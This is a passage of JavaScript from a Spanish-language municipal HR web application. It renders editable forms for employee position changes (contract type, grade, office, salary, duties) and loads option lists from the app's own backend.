                <button class="btn color-button btnMakeSaldoinicla desactivar" disabled style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
                <button class="btn color-button btnMakeEditar" style="float:right; margin: 0 15px;" type="button"> <i class="fa fa-save"></i> EDITAR</button> -->
                <button class="btn btn-otros m-1 delete_fun desactivar" disabled style="float:right" type="button"> <i class="fa fa-trash-o"></i> ELIMINAR</button>          
                <button class="btn btn-otros m-1 btnPdf" style="float:right" type="button"> <i class="fa fa-file-pdf-o"></i> PDF</button>
                <button class="btn btn-otros m-1 btnExcel" style="float:right" type="button"> <i class="fa fa-file-excel-o"></i> EXCEL</button>
                <button class="btn btn-otros m-1 btnMakeEditar" style="float:right" type="button"> <i class="fa fa-pencil"></i> EDITAR</button>
              </div>
                <div class="col-md-3">
                  <label class="label-form" for="tipo_vinculacion">Tipo de vinculación <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required tipo_vinculacion desactivar" disabled placeholder='' required="">
                    ${await vinculacion(data[i]["id_tipovinculacion"])}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el Tipo de vinculación
                  </div>
                </div>
                <div class="col-md-3">
                  <label for="fecha_ingreso_sel" class="label-form">Fecha de Novedad </label>
                  <input type="date" class="form-control input-form color-t disabled border-required fecha_ingreso_sel desactivar" disabled value="${
                    data[i]["fecha_ini"]
                  }">
                  <div class="invalid-feedback">Debe seleccionar la fecha.</div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="ingreso">Año de ingreso <span style="color: red;">*</span></label>
                  <input type="text" class="form-control input-form color-t border-required ingreso year_ingreso" value="${years}" disabled name="ingreso" placeholder="Año de ingreso..." maxlength="255" value="" required="">
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="nivel_select">Nivel <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required nivel_sel desactivar" disabled placeholder='Nivel educativo...' required="">
                  ${await CargarNivel(data[i]["id_nivel"])}
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar el Nivel
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="cargo_propiedad_sel">Denominacion del Empleo <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required cargo_propiedad_sel desactivar" disabled placeholder='Cargo en propiedad educativo...' required="">
                  ${await cargo(data[i]["id_nivel"], data[i]["id_cargo"])}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el Cargo en propiedad
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="codigo">Codigo <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required codigo_sel desactivar" disabled placeholder='Cargo...' required="">
                  ${await CargarCodigo(
                    data[i]["id_cargo"],
                    data[i]["id_codigo"]
                  )}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el Codigo
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="grado">Grado <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required grado_sel desactivar" disabled placeholder='Cargo...' required="">
                  ${await CargarGrado(
                    data[i]["id_codigo"],
                    data[i]["id_grado"]
                  )}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el grado
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="num_posesion">N° Acto de Administrativo <span style="color: red;">*</span></label>
                  <input type="text"  class="form-control input-form color-t border-required num_posesion desactivar" disabled name="num_posesion" placeholder="Posesión..." value="${
                    data[i]["numero_posesion"]
                  }" maxlength="255" value="" required="">
                  <div class="invalid-feedback">
                    Son permitidos un maximo de 11 numeros
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                <label class="label-form" for="fecha_resolucion">Fecha de Acto Administrativo </label>
                <input type="date" class="form-control input-form color-t border-required fecha_resolucion desactivar" disabled name="fecha_resolucion" maxlength="255" value="${
                  data[i]["fecha_resolucion"]
                }">
                <div class="invalid-feedback">
                  Este campo es obligatorio
                  </div>
              </div>
              <div class="col-md-3 mb-2">
                <label class="label-form" for="num_resolucion">N° de Acta Nombramiento <span style="color: red;">*</span></label>
                <input type="number" max="99999999999" class="form-control input-form color-t border-required num_resolucion desactivar" disabled name="num_resolucion" placeholder="Resolución..." value="${
                  data[i]["numero_resolucion"]
                }" maxlength="255" value="" required="">
                <div class="invalid-feedback">
                Son permitido un maximo de 11 numeros
                </div>
              </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="fecha_posesion">Fecha de Posesión  </label>
                  <input type="date" class="form-control input-form color-t border-required fecha_posesion desactivar" disabled name="fecha_posesion" placeholder="Ingrese el Cargo..." value="${
                    data[i]["fecha_posesion"]
                  }" maxlength="255" value="">
                  <div class="invalid-feedback">
                    Este campo es obligatorio
                  </div>
                </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="fecha_fin">Fecha Finalización </label>
    <input type="date" class="form-control input-form color-t border-required fecha_fin desactivar" disabled name="fecha_fin" maxlength="255" value="${
      data[i]["fecha_fin"]
    }" placeholder="Fecha Final">
      <div class="invalid-feedback">
        Este campo es requerido
      </div>
      </div>
      <div class="col-md-3 mb-2">
                  <label class="label-form" for="dependencia">Dependencia <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required dependencia_sel desactivar" disabled placeholder='Cargo...' required="">
                  ${await CargarDependencia(data[i]["id_dependencia"])}
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar el Dependencia
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="sede">Sede <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required sede_sel desactivar" disabled placeholder='Cargo...' required="">
                  ${await cargarsede(data[i]["id_sede"])}
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar el Sede
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="">Motivo <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required motivo desactivar" disabled placeholder='Cargo...' required="">
                    <option value="" disabled>Seleccione...</option>
                    <option ${
                      data[i]["motivo"] == "Encargo" ? "selected" : ""
                    } value="Encargo">Encargo</option>
                    <option ${
                      data[i]["motivo"] == "Reubicacion" ? "selected" : ""
                    } value="Reubicacion">Reubicacion</option>
                    <option ${
                      data[i]["motivo"] == "Comision" ? "selected" : ""
                    } value="Comision">Comisión</option>
                    <option ${
                      data[i]["motivo"] == "Otro" ? "selected" : ""
                    } value="Otro">Otro</option>
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar este campo
                  </div>
                </div>
                <div class="col-md-3 ${
                  data[i]["motivo"] != "Otro" ? "d-none" : ""
                } mb-2 cont_otro">
                  <label class="label-form" for="">Cual? <span style="color: red;">*</span></label>
                  <input type="text" class="form-control input-form color-t border-required otro desactivar" disabled name="otro" placeholder="cual..." maxlength="255" value="">
                </div>
                <div class="col-md-3">
                <label for="sexo" class="label-form">Requiere Entrega del cargo</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos">Si</label>
                    <input type="radio" class="custom-control-input si_procesos entrega_cargo desactivar" disabled ${
                      data[i]["entrega_cargo"] == "SI" ? "checked" : ""
                    } name="procesos_disc${i}" value="SI">
                    <label class="custom-control-label label-form" for="no_procesos">No</label>
                    <input type="radio" class="custom-control-input no_procesos entrega_cargo desactivar" disabled ${
                      data[i]["entrega_cargo"] == "NO" ? "checked" : ""
                    } name="procesos_disc${i}" value="NO">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
                <div class="col-md-3 mb-2">
      <label class="label-form" for="modo_trabajo">Modalidad de Trabajo <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required modo_trabajo desactivar" disabled value="" placeholder='Cargo...' required="">
      <option value="" disabled>Seleccione...</option>
      <option value="Presencial" ${
        data[i]["modo_trabajo"] == "Presencial" ? "selected" : ""
      }>Presencial</option>
        <option value="Virtual" ${
          data[i]["modo_trabajo"] == "Teletrabajo" ? "selected" : ""
        }>Virtual</option>
        <option value="Alternancia" ${
          data[i]["modo_trabajo"] == "Alternancia" ? "selected" : ""
        }>Alternancia</option>
        </select>
      <div class="invalid-feedback">
        Debe seleccionar este campo
        </div>
        </div>
        <div class="col-md-3 mb-2">
      <label class="label-form" for="salario">Salario <span style="color: red;">*</span></label>
      <input type="number" class="form-control input-form color-t border-required salario desactivar" disabled name="salario" maxlength="255" value="${
        data[i]["salario"]
      }" required="" placeholder="Salario">
      <div class="invalid-feedback">
      Este campo es requerido
      </div>
      </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="funciones">Seleccione un archivo</label>
      <input type="file" class="form-control input-form color-t border-required archivo_lab desactivar" disabled name="archivo_lab" maxlength="255" value="" ">
    <div class=" invalid-feedback">
      Este campo es obligatorio
    </div>
  </div>
  <div class="col-md-6 mb-2">
  <label class="label-form" for="funciones">Funciones <span style="color: red;">*</span></label>
  <textarea type="text" class="form-control input-form color-t border-required funciones desactivar" disabled name="funciones" maxlength="255" required="" placeholder="Funciones">${
    data[i]["funciones"]
  }</textarea>
    <div class="invalid-feedback">
    Este campo es requerido
    </div>
</div>
<div class="col-md-3 mb-2">
  <label class="label-form" for="fecha_creacion">Fecha Creación </label>
  <input type="date" disabled class="form-control input-form color-t border-required fecha_creacion" value="${data[i]['fecha_creacion'] == null ? fecha_creacion : data[i]['fecha_creacion']}" name="fecha_creacion" maxlength="255" value="" placeholder="Fecha Final">
  <div class="invalid-feedback">
    Este campo es requerido
  </div>
</div>
<div class="col-md-12 mt-3" style="flex-direction: row-reverse" id="btns">
<button class="btn color-button btnMakeSaldoinicla desactivar" disabled style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
</div>
</div></form>
<hr>`;

          $("#movilidades").append(mov);
          if (i == data.length - 1 && cedula != null) {
            mov = `<form action="" class="mb-3">
      <div class="campos_movilidad">
              <input type="hidden" class="id_movilidad" value="">
              <div class="row padding-secciones">
                <div class="col-md-3">
                  <label class="label-form" for="tipo_vinculacion">Tipo de vinculación <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required tipo_vinculacion" placeholder='' required="">
                    ${await vinculacion(data[i]["id_tipovinculacion"])}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el Tipo de vinculación
                  </div>
                </div>
                <div class="col-md-3">
                  <label for="fecha_ingreso_sel" class="label-form">Fecha de Novedad </label>
                  <input type="date" class="form-control input-form color-t disabled border-required fecha_ingreso_sel" value="${
                    data[i]["fecha_ini"]
                  }">
                  <div class="invalid-feedback">Debe seleccionar la fecha.</div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="ingreso">Año de ingreso <span style="color: red;">*</span></label>
                  <input type="text" class="form-control input-form color-t border-required ingreso year_ingreso" value="${years}" disabled name="ingreso" placeholder="Año de ingreso..." maxlength="255" value="" required="">
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="nivel_select">Nivel <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required nivel_sel" placeholder='Nivel educativo...' required="">
                  ${await CargarNivel(data[i]["id_nivel"])}
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar el Nivel
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="cargo_propiedad_sel">Denominacion del Empleo <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required cargo_propiedad_sel" placeholder='Cargo en propiedad educativo...' required="">
                  ${await cargo(data[i]["id_nivel"], data[i]["id_cargo"])}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el Cargo en propiedad
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="codigo">Codigo <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required codigo_sel" placeholder='Cargo...' required="">
                  ${await CargarCodigo(
                    data[i]["id_cargo"],
                    data[i]["id_codigo"]
                  )}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el Codigo
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="grado">Grado <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required grado_sel" placeholder='Cargo...' required="">
                  ${await CargarGrado(
                    data[i]["id_codigo"],
                    data[i]["id_grado"]
                  )}
                  </select>
                  <div class="invalid-feedback">
                  Debe seleccionar el grado
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="num_posesion">N° Acto de Administrativo <span style="color: red;">*</span></label>
                  <input type="number" max="99999999999" class="form-control input-form color-t border-required num_posesion" name="num_posesion" placeholder="Posesión..." value="${
                    data[i]["numero_posesion"]
                  }" maxlength="255" value="" required="">
                  <div class="invalid-feedback">
                    Son permitidos un maximo de 11 numeros
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                <label class="label-form" for="fecha_resolucion">Fecha de Acto Administrativo </label>
                <input type="date" class="form-control input-form color-t border-required fecha_resolucion" name="fecha_resolucion" maxlength="255" value="${
                  data[i]["fecha_resolucion"]
                }">
                <div class="invalid-feedback">
                  Este campo es obligatorio
                  </div>
              </div>
    <div class="col-md-3 mb-2">
      <label class="label-form" for="num_resolucion">N° de Acta Nombramiento <span style="color: red;">*</span></label>
      <input type="text" class="form-control input-form color-t border-required num_resolucion" name="num_resolucion" placeholder="Resolución..." value="${
        data[i]["numero_resolucion"]
      }" maxlength="255" value="" required="">
      <div class="invalid-feedback">
      Son permitido un maximo de 11 numeros
      </div>
      </div>
      <div class="col-md-3 mb-2">
      <label class="label-form" for="fecha_posesion">Fecha de Posesión </label>
      <input type="date" class="form-control input-form color-t border-required fecha_posesion" name="fecha_posesion" placeholder="Ingrese el Cargo..." value="${
        data[i]["fecha_posesion"]
      }" maxlength="255" value="">
      <div class="invalid-feedback">
        Este campo es obligatorio
      </div>
    </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="fecha_fin">Fecha Finalización </label>
    <input type="date" class="form-control input-form color-t border-required fecha_fin" name="fecha_fin" maxlength="255" value="${
      data[i]["fecha_fin"]
    }" placeholder="Fecha Final">
      <div class="invalid-feedback">
        Este campo es requerido
      </div>
      </div>
      <div class="col-md-3 mb-2">
                  <label class="label-form" for="dependencia">Dependencia <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required dependencia_sel" placeholder='Cargo...' required="">
                  ${await CargarDependencia(data[i]["id_dependencia"])}
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar el Dependencia
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="sede">Sede <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required sede_sel" placeholder='Cargo...' required="">
                  ${await cargarsede(data[i]["id_sede"])}
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar el Sede
                  </div>
                </div>
                <div class="col-md-3 mb-2">
                  <label class="label-form" for="">Motivo <span style="color: red;">*</span></label>
                  <select class="form-control input-form color-t border-required motivo" placeholder='Cargo...' required="">
                    <option value="" disabled>Seleccione...</option>
                    <option ${
                      data[i]["motivo"] == "Encargo" ? "selected" : ""
                    } value="Encargo">Encargo</option>
                    <option ${
                      data[i]["motivo"] == "Reubicacion" ? "selected" : ""
                    } value="Reubicacion">Reubicacion</option>
                    <option ${
                      data[i]["motivo"] == "Comision" ? "selected" : ""
                    } value="Comision">Comisión</option>
                    <option ${
                      data[i]["motivo"] == "Otro" ? "selected" : ""
                    } value="Otro">Otro</option>
                  </select>
                  <div class="invalid-feedback">
                    Debe seleccionar este campo
                  </div>
                </div>
                <div class="col-md-3 ${
                  data[i]["motivo"] != "Otro" ? "d-none" : ""
                } mb-2 cont_otro">
                  <label class="label-form" for="">Cual? <span style="color: red;">*</span></label>
                  <input type="text" class="form-control input-form color-t border-required otro" name="otro" placeholder="cual..." maxlength="255" value="">
                </div>
                <div class="col-md-3">
                <label for="sexo" class="label-form">Requiere Entrega del cargo</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos">Si</label>
                    <input type="radio" class="custom-control-input si_procesos  desactivar" disabled ${data[i]['entrega_cargo'] == 'SI' ? 'checked' : ''} name="procesos_disc${i+1}" value="SI">
                    <label class="custom-control-label label-form" for="no_procesos">No</label>
                    <input type="radio" class="custom-control-input no_procesos  desactivar" disabled ${data[i]['entrega_cargo'] == 'NO' ? 'checked' : ''} name="procesos_disc${i+1}" value="NO">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
                <div class="col-md-3 mb-2">
              <label class="label-form" for="modo_trabajo">Modalidad de Trabajo <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required modo_trabajo" value="" placeholder='Cargo...' required="">
              <option value="" disabled>Seleccione...</option>
              <option value="Presencial" ${
                data[i]["modo_trabajo"] == "Presencial" ? "selected" : ""
              }>Presencial</option>
                <option value="Virtual" ${
                  data[i]["modo_trabajo"] == "Teletrabajo" ? "selected" : ""
                }>Virtual</option>
                <option value="Alternancia" ${
                  data[i]["modo_trabajo"] == "Alternancia" ? "selected" : ""
                }>Alternancia</option>
                </select>
              <div class="invalid-feedback">
                Debe seleccionar este campo
                </div>
                </div>
                <div class="col-md-3 mb-2">
              <label class="label-form" for="salario">Salario <span style="color: red;">*</span></label>
              <input type="number" class="form-control input-form color-t border-required salario" name="salario" maxlength="255" value="${
                data[i]["salario"]
              }" required="" placeholder="Salario">
              <div class="invalid-feedback">
              Este campo es requerido
              </div>
              </div>
            <div class="col-md-3 mb-2">
            <label class="label-form" for="funciones">Seleccione un archivo</label>
              <input type="file" class="form-control input-form color-t border-required archivo_lab" name="archivo_lab" maxlength="255" value="" ">
            <div class=" invalid-feedback">
              Este campo es obligatorio
            </div>
          </div>
          <div class="col-md-6 mb-2">
          <label class="label-form" for="funciones">Funciones <span style="color: red;">*</span></label>
          <textarea type="text" class="form-control input-form color-t border-required funciones" name="funciones" maxlength="255" required="" placeholder="Funciones">${
            data[i]["funciones"]
          }</textarea>
            <div class="invalid-feedback">
            Este campo es requerido
            </div>
        </div>
        <div class="col-md-3 mb-2">
          <label class="label-form" for="fecha_creacion">Fecha Creación </label>
          <input type="date" disabled class="form-control input-form color-t border-required fecha_creacion" value="${data[i]['fecha_creacion'] == null ? fecha_creacion : data[i]['fecha_creacion']}" name="fecha_creacion" maxlength="255" value="" placeholder="Fecha Final">
          <div class="invalid-feedback">
            Este campo es requerido
          </div>
        </div>
        <div class="col-md-12 mt-3" style="flex-direction: row-reverse" id="btns">
        <button class="btn color-button btnMakeSaldoinicla" style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
        </div>
        </div></form>
        <hr>`;

            $("#movilidades").append(mov);
          }
        }
      }());
      // (function () {
      boton = `<button class="btn color-button " id="btnIrAtras" style="float:right" type="button"> IR ATRAS</button>`;
      $("#btn_2").html(boton);
      // }());
    }
  });
}

// function cargardependencia() {
//   $.post('ajaxGeneral.php?mode=dependencia')
//     .done(function (data) {
//       if (data.trim() !== '') {
//         data = JSON.parse(data);
//         // console.log(data);
//         let codigo = '<option value="" selected disabled>Seleccione...</option>';
//         if (data.error != undefined) {
//           alert(data.error);
//         } else {
//           $.each(data, function () {
//             codigo += `<option value="${this.id_dependencia}">${this.dependencia}</option>`;
//           });
//         }
//         $('#dependencia_mov').html(codigo);
//       }
//     })
// }

async function cargadoDatos(
  data /*vinculaciones, niveles, cargos, codigos, grados, dependencias, sedes*/
) {
  // $('.fecha_posesion').val(data.fecha_posesion)
  // $('.num_posesion').val(data.numero_posesion)
  // $('.num_resolucion').val(data.numero_resolucion)
  // $('.fecha_resolucion').val(data.fecha_resolucion)
  // $('.modo_trabajo').val(data.modo_trabajo)
  // // $('#archivo_lab').val(data.archivo_laboral)
  // $('.fecha_fin').val(data.fecha_fin)
  // $('.salario').val(data.salario)
  // $('.funciones').val(data.funciones)

  years = new Date(data.fecha_ini).getFullYear();
  await (async function () {
    mov += `<div class="campos_movilidad">
    <input type="hidden" class="id_movilidad" value="${data.id_movilidad}">
  <div class="row padding-secciones">
  <div class="col-md-3">
  <label class="label-form" for="tipo_vinculacion">Tipo de vinculación <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required tipo_vinculacion desactivar" disabled placeholder='' required="">
        ${await vinculacion(data.id_tipovinculacion)}
        </select>
        <div class="invalid-feedback">
        Debe seleccionar el Tipo de vinculación
        </div>
        </div>
        <div class="col-md-3">
        <label for="fecha_ingreso_sel" class="label-form">Fecha de Novedad <span style="color: red;">*</span></label>
      <input type="date" class="form-control input-form color-t disabled border-required fecha_ingreso_sel desactivar" disabled value="${
        data.fecha_ini
      }" required="">
      <div class="invalid-feedback">Debe seleccionar la fecha.</div>
      </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="ingreso">Año de ingreso <span style="color: red;">*</span></label>
    <input type="text" class="form-control input-form color-t border-required ingreso year_ingreso" value="${years}" disabled name="ingreso" placeholder="Año de ingreso..." maxlength="255" value="" required="">
    </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="nivel_select">Nivel <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required nivel_sel desactivar" disabled placeholder='Nivel educativo...' required="">
      ${await CargarNivel(data.id_nivel)}
      </select>
      <div class="invalid-feedback">
      Debe seleccionar el Nivel
      </div>
      </div>
    <div class="col-md-3 mb-2">
      <label class="label-form" for="cargo_propiedad_sel">Cargo en propiedad <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required cargo_propiedad_sel desactivar" disabled placeholder='Cargo en propiedad educativo...' required="">
      ${await cargo(data.id_nivel, data.id_cargo)}
      </select>
      <div class="invalid-feedback">
      Debe seleccionar el Cargo en propiedad
      </div>
      </div>
      <div class="col-md-3 mb-2">
      <label class="label-form" for="codigo">Codigo <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required codigo_sel desactivar" disabled placeholder='Cargo...' required="">
      ${await CargarCodigo(data.id_cargo, data.id_codigo)}
      </select>
      <div class="invalid-feedback">
      Debe seleccionar el Codigo
      </div>
    </div>
    <div class="col-md-3 mb-2">
      <label class="label-form" for="grado">Grado <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required grado_sel desactivar" disabled placeholder='Cargo...' required="">
      ${await CargarGrado(data.id_codigo, data.id_grado)}
      </select>
      <div class="invalid-feedback">
      Debe seleccionar el grado
      </div>
    </div>
    <div class="col-md-3 mb-2">
      <label class="label-form" for="dependencia">Dependencia <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required dependencia_sel desactivar" disabled placeholder='Cargo...' required="">
      ${await CargarDependencia(data.id_dependencia)}
      </select>
      <div class="invalid-feedback">
        Debe seleccionar el Dependencia
        </div>
        </div>
    <div class="col-md-3 mb-2">
      <label class="label-form" for="sede">Sede <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required sede_sel desactivar" disabled placeholder='Cargo...' required="">
      ${await cargarsede(data.id_sede)}
      </select>
      <div class="invalid-feedback">
      Debe seleccionar el Sede
      </div>
    </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="num_posesion">N° Acto de Administrativo<span style="color: red;">*</span></label>
    <input type="text" class="form-control input-form color-t border-required num_posesion desactivar" disabled name="num_posesion" placeholder="Posesión..." value="${
      data.numero_posesion
    }" maxlength="255" value="" required="">
      <div class="invalid-feedback">
      Son permitidos un maximo de 11 numeros
      </div>
      </div>
      <div class="col-md-3 mb-2">
      <label class="label-form" for="fecha_resolucion">Fecha de Acto Administrativo <span style="color: red;">*</span></label>
      <input type="date" class="form-control input-form color-t border-required fecha_resolucion desactivar" disabled name="fecha_resolucion" maxlength="255" value="${
        data.fecha_resolucion
      }" required="">
      <div class="invalid-feedback">
        Este campo es obligatorio
        </div>
    </div>
      <div class="col-md-3 mb-2">
      <label class="label-form" for="fecha_posesion">Fecha de Posesión <span style="color: red;">*</span></label>
      <input type="date" class="form-control input-form color-t border-required fecha_posesion desactivar" disabled name="fecha_posesion" placeholder="Ingrese el Cargo..." value="${
        data.fecha_posesion
      }" maxlength="255" value="" required="">
      <div class="invalid-feedback">
        Este campo es obligatorio
      </div>
    </div>
    <div class="col-md-3 mb-2">
      <label class="label-form" for="num_resolucion">N° de Resolución <span style="color: red;">*</span></label>
      <input type="text" class="form-control input-form color-t border-required num_resolucion desactivar" disabled name="num_resolucion" placeholder="Resolución..." value="${
        data.numero_resolucion
      }" maxlength="255" value="" required="">
      <div class="invalid-feedback">
      Son permitido un maximo de 11 numeros
      </div>
      </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="fecha_fin">Fecha Finalización </label>
    <input type="date" class="form-control input-form color-t border-required fecha_fin desactivar" disabled name="fecha_fin" maxlength="255" value="${
      data.fecha_fin
    }" placeholder="Fecha Final">
      <div class="invalid-feedback">
        Este campo es requerido
      </div>
      </div>
      <div class="col-md-3">
                <label for="sexo" class="label-form">Requiere Entrega del cargo</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos">Si</label>
                    <input type="radio" class="custom-control-input si_procesos  desactivar" disabled ${data[i]['entrega_cargo'] == 'SI' ? 'checked' : ''} name="procesos_disc${i+1}" value="SI">
                    <label class="custom-control-label label-form" for="no_procesos">No</label>
                    <input type="radio" class="custom-control-input no_procesos  desactivar" disabled ${data[i]['entrega_cargo'] == 'NO' ? 'checked' : ''} name="procesos_disc${i+1}" value="NO">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
      <div class="col-md-3 mb-2">
      <label class="label-form" for="modo_trabajo">Modalidad de Trabajo <span style="color: red;">*</span></label>
      <select class="form-control input-form color-t border-required modo_trabajo desactivar" disabled value="" placeholder='Cargo...' required="">
      <option value="" disabled>Seleccione...</option>
      <option value="Presencial" ${
        data.modo_trabajo == "Presencial" ? "selected" : ""
      }>Presencial</option>
        <option value="Virtual" ${
          data.modo_trabajo == "Teletrabajo" ? "selected" : ""
        }>Virtual</option>
        <option value="Alternancia" ${
          data.modo_trabajo == "Alternancia" ? "selected" : ""
        }>Alternancia</option>
        </select>
      <div class="invalid-feedback">
        Debe seleccionar este campo
        </div>
        </div>
        <div class="col-md-3 mb-2">
      <label class="label-form" for="salario">Salario <span style="color: red;">*</span></label>
      <input type="number" class="form-control input-form color-t border-required salario desactivar" disabled name="salario" maxlength="255" value="${
        data.salario
      }" required="" placeholder="Salario">
      <div class="invalid-feedback">
      Este campo es requerido
      </div>
      </div>
    <div class="col-md-3 mb-2">
    <label class="label-form" for="funciones">Seleccione un archivo</label>
      <input type="file" class="form-control input-form color-t border-required archivo_lab desactivar" disabled name="archivo_lab" maxlength="255" value="" ">
    <div class=" invalid-feedback">
      Este campo es obligatorio
    </div>
  </div>
  <div class="col-md-6 mb-2">
  <label class="label-form" for="funciones">Funciones <span style="color: red;">*</span></label>
  <textarea type="text" class="form-control input-form color-t border-required funciones desactivar" disabled name="funciones" maxlength="255" required="" placeholder="Funciones">${
    data.funciones
  }</textarea>
    <div class="invalid-feedback">
    Este campo es requerido
    </div>
</div>
<div class="col-md-12 mt-3" style="flex-direction: row-reverse" id="btns">
<button class="btn btn-danger btn-sm desactivar delete_fun" disabled style="float:right; margin: 0 15px;" type="button"> <i class="fa fa-save"></i> ELIMINAR</button>
<button class="btn color-button btnMakeSaldoinicla desactivar" disabled style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
<button class="btn color-button btnMakeEditar" style="float:right; margin: 0 15px;" type="button"> <i class="fa fa-save"></i> EDITAR</button>
</div>
</div>
<hr>`;

    $("#movilidades").append(mov);
  })();
}

function cargarsede(id_sede = null, cargado = null) {
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=sede");
    // xhr.open("POST", "http://jamundi.my/ajaxGeneral.php?mode=sede");
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_sede != null) educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_sede == this.id_sede)
          educa += `<option selected value="${this.id_sede}">${this.sede}</option>`;
        else educa += `<option value="${this.id_sede}">${this.sede}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (id_sede != null || cargado != null) resolve(educa);
      // se accede con 'then()'
      else {
        $(".sede_sel").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=sede')
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let codigo = '<option value=""seleted disabled>Seleccione...</option>';
  //       if (id_sede != null)
  //         codigo = '<option value="" disabled>Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alert(data.error);
  //       } else {
  //         $.each(data, function () {
  //           if (id_sede == this.id_sede)
  //             codigo += `<option selected value="${this.id_sede}">${this.sede}</option>`;
  //           else
  //             codigo += `<option value="${this.id_sede}">${this.sede}</option>`;
  //         });
  //         if (id_sede != null)
  //           return codigo;
  //         $('.sede_sel').html(codigo);
  //       }
  //     }
  //   })
}

function loadReporteEcxel() {
  var filtro = $("#id_funcionario").val();
  // if (filtro != '' && filtro != null) {
  newwindow = window.open(
    "?view=reportes&mode=reportemovilidadexcel&id_f=" +
      filtro +
      "&todos=All&filtro=",
    "width=815,height=460"
  );
  if (newwindow == null) {
    alert(
      "Configure el navegador para que permita las ventanas emergentes en esta pagina"
    );
  } else {
    newwindow.creator = self;
  }
}

function loadReportePDF() {
